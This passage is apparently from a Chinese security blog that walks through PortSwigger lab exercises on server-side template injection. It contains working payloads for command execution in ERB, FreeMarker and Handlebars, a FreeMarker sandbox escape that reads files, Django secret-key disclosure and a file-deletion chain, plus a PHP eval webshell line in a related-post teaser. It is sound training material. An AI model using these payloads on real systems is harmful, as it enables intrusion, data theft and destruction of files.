up template data.</span></span><br><span class="line">toy = <span class="title class_">Product</span>.new( <span class="string">&quot;TZ-1002&quot;</span>,</span><br><span class="line">                   <span class="string">&quot;Rubysapien&quot;</span>,</span><br><span class="line">                   <span class="string">&quot;Geek&#x27;s Best Friend!  Responds to Ruby commands...&quot;</span>,</span><br><span class="line">                   <span class="number">999.95</span> )</span><br><span class="line">toy.add_feature(<span class="string">&quot;Listens for verbal commands in the Ruby language!&quot;</span>)</span><br><span class="line">toy.add_feature(<span class="string">&quot;Ignores Perl, Java, and all C variants.&quot;</span>)</span><br><span class="line">toy.add_feature(<span class="string">&quot;Karate-Chop Action!!!&quot;</span>)</span><br><span class="line">toy.add_feature(<span class="string">&quot;Matz signature on left leg.&quot;</span>)</span><br><span class="line">toy.add_feature(<span class="string">&quot;Gem studded eyes... Rubies, of course!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Produce result.</span></span><br><span class="line">rhtml.run(toy.get_binding)</span><br></pre></td></tr></table></figure>
+
+<p>生成：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Ruby Toys -- Rubysapien<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Rubysapien (TZ-1002)<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Geek&#x27;s Best Friend!  Responds to Ruby commands...<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>Listens for verbal commands in the Ruby language!<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>Ignores Perl, Java, and all C variants.<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>Karate-Chop Action!!!<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>Matz signature on left leg.<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>Gem studded eyes... Rubies, of course!<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">         Call for a price, today!</span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="4-1-2-Solve"><a href="#4-1-2-Solve" class="headerlink" title="4.1.2 Solve"></a>4.1.2 Solve</h3><p>点开是个商品页面，查看第一个商品发现是已经卖完了</p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240906155901417.png" alt="image-20240906155901417"></p>
+<p>检查一下这个数据包，发现是一个302跳转，并且是重定向到根页面附带一个<code>message</code>参数，值就是回显的信息：</p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240906160041413.png" alt="image-20240906160041413"></p>
+<p>一般可能会考虑一下XSS漏洞？但发现打入payload也是原封不动地回显了出来：</p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240906160400180.png" alt="image-20240906160400180"></p>
+<p>一看代码发现直接转义了，好像不存在XSS：</p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240906160520244.png" alt="image-20240906160520244"></p>
+<p>那就根据题目意思，猜他这里是利用ERB的模板生成功能产生的页面，会对这个用户输入的数据作为页面的HTML内容输出，外面再包一层<code>&lt;div&gt;</code>标签&#x3D;&#x3D;通过直接GET &#x2F;得知&#x3D;&#x3D;</p>
+<p>那就判断一下是不是会执行Ruby代码，<code>message</code>字段传参<code>&lt;%= 7*7 %&gt;</code>（注意使用url编码），发过去发现表达式被计算了：</p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240906161527494.png" alt="image-20240906161527494"></p>
+<p>剩下的就可以查询Ruby语言执行系统命令的代码：<code>system(&quot;rm /home/carlos/morale.txt&quot;)</code>，构成ERB Payload：<code>&lt;%= system(&quot;rm /home/carlos/morale.txt&quot;) %&gt;</code>，放到<code>message</code>再发一遍，显示<code>true</code></p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240906161650210.png" alt="image-20240906161650210"></p>
+<p>done</p>
+<h2 id="4-2-Basic-server-side-template-injection-code-context"><a href="#4-2-Basic-server-side-template-injection-code-context" class="headerlink" title="4.2 Basic server-side template injection (code context)"></a>4.2 Basic server-side template injection (code context)</h2><p>Tornado模板构造不当导致的SSTI，目标是构造代码，删除Carlos家目录中的<code>morale.txt</code>文件</p>
+<p>可以使用<code>wiener:peter</code>登录账号</p>
+<h3 id="4-2-1-Tornado的前置知识"><a href="#4-2-1-Tornado的前置知识" class="headerlink" title="4.2.1 Tornado的前置知识"></a>4.2.1 Tornado的前置知识</h3><p>Tornado 全称 Tornado Web Server，是一个用 Python 语言写成的 Web 服务器兼 Web 应用框架，由 FriendFeed 公司在自己的网站 FriendFeed 中使用，被 Facebook 收购以后框架在 2009 年 9 月以开源软件形式开放给大众。</p>
+<p><a target="_blank" rel="noopener" href="https://tornado-zh.readthedocs.io/zh/latest/guide/templates.html">文档</a></p>
+<p>template.html:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123; title &#125;&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">       &#123;% for item in items %&#125;</span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123; escape(item) &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">       &#123;% end %&#125;</span><br><span class="line">     <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>对应的Python渲染代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MainHandler</span>(tornado.web.RequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        items = [<span class="string">&quot;Item 1&quot;</span>, <span class="string">&quot;Item 2&quot;</span>, <span class="string">&quot;Item 3&quot;</span>]</span><br><span class="line">        <span class="variable language_">self</span>.render(<span class="string">&quot;template.html&quot;</span>, title=<span class="string">&quot;My title&quot;</span>, items=items)</span><br></pre></td></tr></table></figure>
+
+<p>Tornado模板支持 <em>控制语句(control statements)</em> 和 <em>表达式(expressions)</em>. 控制语句被包在 <code>&#123;%` 和 `%&#125;</code> 中间, e.g., <code>&#123;% if len(items) > 2 %&#125;</code>. 表达式被包在 <code>&#123;&#123;` 和 `&#125;&#125;</code> 之间, e.g., <code>&#123;&#123; items[0] &#125;&#125;</code>.</p>
+<p>控制语句或多或少都和Python语句类似. 我们支持 <code>if</code>, <code>for</code>, <code>while</code>, 和 <code>try</code>, 这些都必须使用 <code>&#123;% end %&#125;</code> 来标识结束. 我们也 支持 <em>模板继承(template inheritance)</em> 使用 <code>extends</code> 和 <code>block</code> 标签声明, 这些内容的详细信息都可以在 <a target="_blank" rel="noopener" href="https://tornado-zh.readthedocs.io/zh/latest/template.html#module-tornado.template"><code>tornado.template</code></a> 中看到.</p>
+<h3 id="4-2-2-Solve"><a href="#4-2-2-Solve" class="headerlink" title="4.2.2 Solve"></a>4.2.2 Solve</h3><p>打开是一个文章列表，已登录用户可以评论</p>
+<p>随便找个文章发表一下高见，评论的样子：</p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240906183111183.png" alt="image-20240906183111183"></p>
+<p>然而在个人中心那块，有个设置，是指定显示的用户名：</p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240906183151934.png" alt="image-20240906183151934"></p>
+<p>对应接口长这样：</p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240906183250961.png" alt="image-20240906183250961"></p>
+<p>注意到这里用的是<code>user.name</code>，根据实验信息，这个可能是就是SSTI的接收用户输入作为模板参数的地方</p>
+<p>进一步验证，尝试破坏可能的模板结构：</p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240906183540020.png" alt="image-20240906183540020"></p>
+<p>跟随跳转不知道成不成功，但是再回到之前查看评论的地方，发现报语法错误：</p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240906183645736.png" alt="image-20240906183645736"></p>
+<p>或者修改payload为<code>user.nam</code>，引用不存在的属性，也会报错：</p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240906183801885.png" alt="image-20240906183801885"></p>
+<p>测试找到可能的闭合方式，设置payload为：</p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240910192435994.png" alt="image-20240910192435994"></p>
+<p>发现显示的用户名后面多了“49”，表达式被正确执行了：</p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240906183948670.png" alt="image-20240906183948670"></p>
+<p>因此注入payload的方式为：</p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240910192445070.png" alt="image-20240910192445070"></p>
+<p>根据实验目标，结合Tornado的文档，要<code>import os</code>然后执行系统命令，payload：</p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240910192502919.png" alt="image-20240910192502919"></p>
+<p>发包</p>
+<p>然后刷新一下页面进行渲染（执行命令）</p>
+<p>done</p>
+<h2 id="4-3-Server-side-template-injection-using-documentation"><a href="#4-3-Server-side-template-injection-using-documentation" class="headerlink" title="4.3 Server-side template injection using documentation"></a>4.3 Server-side template injection using documentation</h2><p>自己判断是什么模板引擎，然后自己构造能用的EXP，目标是删除Carlos家目录中的morale.txt文件</p>
+<p>可以用这个账号登陆进去：<code>content-manager:C0nt3ntM4n4g3r</code></p>
+<h3 id="4-3-1-Solve"><a href="#4-3-1-Solve" class="headerlink" title="4.3.1 Solve"></a>4.3.1 Solve</h3><p>登陆进去之后，查看任意产品页面，发现可以编辑模板：</p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240907102216584.png" alt="image-20240907102216584"></p>
+<p>随便破坏构造语句（使用不存在的成员变量），看看报错的提示：</p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240907102413716.png" alt="image-20240907102413716"></p>
+<p>发现用的是FreeMarker模板引擎</p>
+<p>阅读FreeMarker的官方文档，FAQ那一栏，有一个有意思的问题是“23. 我可以允许用户上传模板吗？这样做有什么安全影响？”，这部分内容描述了内置的<code>new()</code>函数的危险性</p>
+<p>接着可以到对应的<a target="_blank" rel="noopener" href="https://freemarker.apache.org/docs/ref_builtins_expert.html#ref_builtin_new">参考页面</a>看看这个<code>new()</code>怎么用，涉及到另一种Java接口：<code>TemplateModel</code>，阅读Java官方文档发现有一个是实现了该接口的类<code>Execute</code>可以实现执行命令：</p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240907103643936.png" alt="image-20240907103643936"></p>
+<p>结合FreeMarker文档以及Java文档，可以构造出这样的Payload放到模板中：<code>&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;rm /home/carlos/morale.txt&quot;) &#125;</code></p>
+<p>之后选择浏览或应用，让后端服务器渲染一遍即可执行payload</p>
+<p>done</p>
+<h2 id="4-4-Server-side-template-injection-in-an-unknown-language-with-a-documented-exploit"><a href="#4-4-Server-side-template-injection-in-an-unknown-language-with-a-documented-exploit" class="headerlink" title="4.4 Server-side template injection in an unknown language with a documented exploit"></a>4.4 Server-side template injection in an unknown language with a documented exploit</h2><p>没说是什么模板引擎，要自己测，目标是删除Carlos家目录中的morale.txt文件</p>
+<h3 id="4-4-1-Solve"><a href="#4-4-1-Solve" class="headerlink" title="4.4.1 Solve"></a>4.4.1 Solve</h3><p>查看第一个商品，依旧显示卖完了，可能还是4.1节的那个注入点</p>
+<p>随便打点破坏结构的payload：<code>https://0ae8007403a23e1881c5ca1b00530083.web-security-academy.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock&#123;&#123;7*7&#125;&#125;</code></p>
+<p>显示：</p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240910170511727.png" alt="image-20240910170511727"></p>
+<p>看着像是handlebars模板引擎</p>
+<p>上网搜索handlebars相关的模板注入漏洞，发现一个比较出名的POC：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/176121">https://www.anquanke.com/post/id/176121</a></p>
+<p>得知最后可以使用下面这个payload进行命令执行&#x3D;&#x3D;太牛了吧&#x3D;&#x3D;：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">wrtz&#123;&#123;#with &quot;s&quot; as |string|&#125;&#125;</span><br><span class="line">    &#123;&#123;#with &quot;e&quot;&#125;&#125;</span><br><span class="line">        &#123;&#123;#with split as |conslist|&#125;&#125;</span><br><span class="line">            &#123;&#123;this.pop&#125;&#125;</span><br><span class="line">            &#123;&#123;this.push (lookup string.sub &quot;constructor&quot;)&#125;&#125;</span><br><span class="line">            &#123;&#123;this.pop&#125;&#125;</span><br><span class="line">            &#123;&#123;#with string.split as |codelist|&#125;&#125;</span><br><span class="line">                &#123;&#123;this.pop&#125;&#125;</span><br><span class="line">                &#123;&#123;this.push &quot;return require(&#x27;child_process&#x27;).exec(&#x27;rm /home/carlos/morale.txt&#x27;);&quot;&#125;&#125;</span><br><span class="line">                &#123;&#123;this.pop&#125;&#125;</span><br><span class="line">                &#123;&#123;#each conslist&#125;&#125;</span><br><span class="line">                    &#123;&#123;#with (string.sub.apply 0 codelist)&#125;&#125;</span><br><span class="line">                        &#123;&#123;this&#125;&#125;</span><br><span class="line">                    &#123;&#123;/with&#125;&#125;</span><br><span class="line">                &#123;&#123;/each&#125;&#125;</span><br><span class="line">            &#123;&#123;/with&#125;&#125;</span><br><span class="line">        &#123;&#123;/with&#125;&#125;</span><br><span class="line">    &#123;&#123;/with&#125;&#125;</span><br><span class="line">&#123;&#123;/with&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>url编码之后作为<code>message</code>的值再发送，搞定</p>
+<p>&#x3D;&#x3D;关键是要学会上网搜索相关信息吧&#x3D;&#x3D;</p>
+<p>done</p>
+<h2 id="4-5-Server-side-template-injection-with-information-disclosure-via-user-supplied-objects"><a href="#4-5-Server-side-template-injection-with-information-disclosure-via-user-supplied-objects" class="headerlink" title="4.5 Server-side template injection with information disclosure via user-supplied objects"></a>4.5 Server-side template injection with information disclosure via user-supplied objects</h2><p>目标是窃取并提交框架的密钥</p>
+<p>可以使用以下这个账户登进去：<code>content-manager:C0nt3ntM4n4g3r</code></p>
+<h3 id="4-5-1-Solve"><a href="#4-5-1-Solve" class="headerlink" title="4.5.1 Solve"></a>4.5.1 Solve</h3><p>登录账户进去之后，随便点开一个商品页面，就可以编辑模板</p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240910174149430.png" alt="image-20240910174149430"></p>
+<p>随便使用<code>$&#123;&#123;<%[%'"&#125;&#125;%\</code>等字符fuzz一下，爆出报错信息，得知是django的模板引擎</p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240910174255108.png" alt="image-20240910174255108"></p>
+<p>接下来就是去翻<a target="_blank" rel="noopener" href="https://docs.djangoproject.com/zh-hans/5.1/topics/templates/">django的文档</a>，得知有一个内置的<code>debug</code>模板标签可以用于调试信息</p>
+<p>尝试这样查看调试：</p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240910175008655.png" alt="image-20240910175008655"></p>
+<p>接着就会输出一大串目标环境的环境信息，其中有个<code>settings</code>对象是比较关键的</p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240910175625411.png" alt="image-20240910175625411"></p>
+<p>翻阅django的文档，得知<code>settings</code>里面的<code>SECRET_KEY</code>就是我们要的目标：</p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240910175852596.png" alt="image-20240910175852596"></p>
+<p>接下来就直接<code>&#123;&#123;settings.SECRET_KEY&#125;&#125;</code>这样去访问就好了</p>
+<p>done</p>
+<h2 id="4-6-Server-side-template-injection-in-a-sandboxed-environment"><a href="#4-6-Server-side-template-injection-in-a-sandboxed-environment" class="headerlink" title="4.6 Server-side template injection in a sandboxed environment"></a>4.6 Server-side template injection in a sandboxed environment</h2><p>目标环境使用Freemarker模板引擎，并且存在可以逃逸的沙箱环境</p>
+<p>目标是从Carlos的家目录中读取my_password.txt文件</p>
+<p>可以使用以下这个账户登进去：<code>content-manager:C0nt3ntM4n4g3r</code></p>
+<h3 id="4-6-1-Solve"><a href="#4-6-1-Solve" class="headerlink" title="4.6.1 Solve"></a>4.6.1 Solve</h3><p>呃呃，也是编辑模板的套路，主要是翻阅Java的文档，得知对于任意一个Java对象示例，都可以使用<code>getClass()</code>方法获取对象的基本信息，像这样：</p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240910181658401.png" alt="image-20240910181658401"></p>
+<p>然后继续翻阅文档，然后找到一系列方法调用，包括使用静态方法赋予对类的访问权限，最后通过一个静态方法读取文件：</p>
+<p><code>$&#123;product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve(&#39;/home/carlos/my_password.txt&#39;).toURL().openStream().readAllBytes()?join(&quot; &quot;)&#125;</code></p>
+<p>最后得出一串十进制ASCII编码，转化成字符得到flag</p>
+<p>done</p>
+<h2 id="4-7-Server-side-template-injection-with-a-custom-exploit"><a href="#4-7-Server-side-template-injection-with-a-custom-exploit" class="headerlink" title="4.7 Server-side template injection with a custom exploit"></a>4.7 Server-side template injection with a custom exploit</h2><p>没说是什么模板引擎，目标是删除Carlos的家目录中的<code>/.ssh/id_rsa</code></p>
+<p>使用这个账户登录进去：<code>wiener:peter</code></p>
+<blockquote>
+<p>小心打坏靶场，如果打坏了20分钟后靶场自动重置</p>
+</blockquote>
+<h3 id="4-7-1-Solve"><a href="#4-7-1-Solve" class="headerlink" title="4.7.1 Solve"></a>4.7.1 Solve</h3><p>一个博客网站，应该是像4.2节那样的，通过评论显示的用户名进行模板注入</p>
+<p>但是这时多了一个上传头像的接口，直接上传空头像，会返回一些错误信息：</p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240910182937749.png" alt="image-20240910182937749"></p>
+<p>如果上传文本文件，则会显示：</p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240910183332785.png" alt="image-20240910183332785"></p>
+<p>注意到了<code>user</code>这个对象有一个<code>setAvatar()</code>作为设置头像的接口，还有一个<code>User.php</code>文件，可能存放了用户行为相关的代码</p>
+<p>随便上传一个正常头像，然后发条评论，看看页面：</p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240910183550836.png" alt="image-20240910183550836"></p>
+<p>回到个人账户设置页面，捕获修改名称显示偏好的POST请求包，发现<code>user.name</code>，根据模板注入，尝试直接执行<code>setAvatar()</code>方法，设置头像为<code>/etc/passwd</code></p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240910183720403.png" alt="image-20240910183720403"></p>
+<p>&#x3D;&#x3D;注意查看报错信息，可能会叫你加上文件类型：user.setAvatar(‘&#x2F;etc&#x2F;passwd’,’image&#x2F;jpg’)&#x3D;&#x3D;</p>
+<p>再回到评论页面，发现头像已失效</p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240910184657966.png" alt="image-20240910184657966"></p>
+<p>新标签页打开头像，发现会下载到<code>/etc/passwd</code>：</p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240910184725120.png" alt="image-20240910184725120"></p>
+<p>证明了存在任意文件读取漏洞</p>
+<p>看看之前发现的那个<code>User.php</code>是个什么玩意，同样的方法替换设置名称显示偏好的参数为：<code>user.setAvatar(&#39;/home/carlos/User.php&#39;,&#39;image/jpg&#39;)</code></p>
+<p>在访问看看，得到这段代码：</p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240910185209664.png" alt="image-20240910185209664"></p>
+<p>审计代码，发现有一个方法可以删除头像文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">gdprDelete</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">rm</span>(<span class="title function_ invoke__">readlink</span>(<span class="variable">$this</span>-&gt;avatarLink));</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">rm</span>(<span class="variable">$this</span>-&gt;avatarLink);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">delete</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>于是再回到设置名称显示偏好的POST包，替换参数为：<code>user.setAvatar(&#39;/home/carlos/.ssh/id_rsa&#39;,&#39;image/jpg&#39;)</code>，将头像指向目标文件</p>
+<p>接着再替换成<code>user.gdprDelete()</code>，删除实际指向了目标文件的头像</p>
+<p>done</p>
+<p>关键在于：</p>
+<ul>
+<li>设置名称显示偏好的地方，使用了user类的方法，导致（任意）命令执行</li>
+<li>设置头像的方法没有对参数进行过滤，通过头像导致任意文件读取</li>
+<li>读取<code>User.php</code>的代码，进一步挖掘user类的所有方法</li>
+</ul>
+	
+		</div>
+		
+		<div id="current-post-cover" data-scr="/img/post-cover/portswigger.jpg"></div>
+
+		<!-- relate post, comment...-->
+		<div class="investment-container">
+			<div class="investment-header">
+				<div class="investment-title-1">
+					<div class="on">相关文章</div>
+					<div>评论</div>
+					<!-- <div>分享</div> -->
+				</div>
+				<div class="investment-title-2">	            
+					
+	<span>
+		<a id="totop-post-page">返回顶部</a>
+		
+		
+			<a href="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/" title="K8S靶场-Kubernetes Goat" rel="next">
+				下一篇&raquo;
+			</a>
+			
+	</span>
+
+
+      		
+				</div>	
+			</div>
+			
+			<div class="investment-content">
+				<div class="investment-content-list">
+					
+
+<div class="relate-post">
+	
+		<ul>
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/07/07/Web%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86-SQLi/" title="Web漏洞整理-SQLi">
+								Web漏洞整理-SQLi			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								七月 7日, 2023				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] SQLi前言主要是之前练习了很多靶场所设计到的SQLi的笔记都比较分散这里就系统地整理下，主要是整合到一起，方便以后查阅
+整理自靶场练习Webgoat、pikachu、Web For Pentester、XVWA、sql...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/07/07/Web%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86-SQLi/" title="Web漏洞整理-SQLi">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/WebVuln1.jpg" alt="Web漏洞整理-SQLi"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/06/04/Web%E9%9D%B6%E5%9C%BA-upload-labs/" title="Web靶场-upload-labs">
+								Web靶场-upload-labs			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								六月 4日, 2023				
+							</p>
+							<p class="relate-post-content">
+								环境攻击机：kali 10.10.10.128靶机：Debian 11.1 x64 
+Pass-01任务：上传一个webshell到服务器
+直接怼，显示：
+
+改成basic.jpg，点击上传后bp抓包，修改后缀为.php，上传成功了：...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/06/04/Web%E9%9D%B6%E5%9C%BA-upload-labs/" title="Web靶场-upload-labs">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/default.jpg" alt="Web靶场-upload-labs"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/05/04/PHP-Web%E6%B8%97%E9%80%8F%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AB%98%E5%8D%B1%E5%87%BD%E6%95%B0%E4%BB%A5%E5%8F%8A%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="PHP-Web渗透中常见的高危函数以及伪协议">
+								PHP-Web渗透中常见的高危函数以及伪协议			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 4日, 2023				
+							</p>
+							<p class="relate-post-content">
+								代码执行函数eval
+代码：&lt;?php @eval($_GET[&#39;cmd&#39;]);?&gt;
+利用：http://10.10.10.3/test.php?cmd=phpinfo();
+assert
+代码：&lt;?...
+							</p>
+						</div>
+
